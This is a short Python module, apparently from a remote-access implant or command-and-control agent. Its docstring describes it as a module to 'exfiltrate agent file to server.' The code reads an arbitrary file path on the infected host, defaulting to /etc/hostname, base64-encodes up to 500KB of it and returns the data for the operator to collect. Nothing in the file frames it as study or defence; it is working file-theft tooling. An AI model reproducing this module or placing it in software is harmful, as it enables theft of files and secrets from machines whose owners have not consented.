"""Download module — exfiltrate agent file to server."""
import os, base64
def run(args):
    source = args.get('source') or args.get('path', '/etc/hostname')
    max_bytes = 500 * 1024  # 500KB
    try:
        if not os.path.exists(source):
            return {'status': 'missing', 'source': source, 'type': 'download', 'error': 'file not found'}
        size = os.path.getsize(source)
        with open(source, 'rb') as f:
            data = f.read(max_bytes + 1)
        if len(data) > max_bytes:
            return {'status': 'truncated', 'source': source, 'type': 'download', 'size': size, 'note': f'truncated at {max_bytes} bytes'}
        encoded = base64.b64encode(data[:max_bytes]).decode('ascii')
        return {'status': 'downloaded', 'source': source, 'type': 'download', 'size': len(data), 'mime': 'application/octet-stream', 'b64': encoded}
    except Exception as e:
        return {'status': 'error', 'error': str(e), 'type': 'download'}
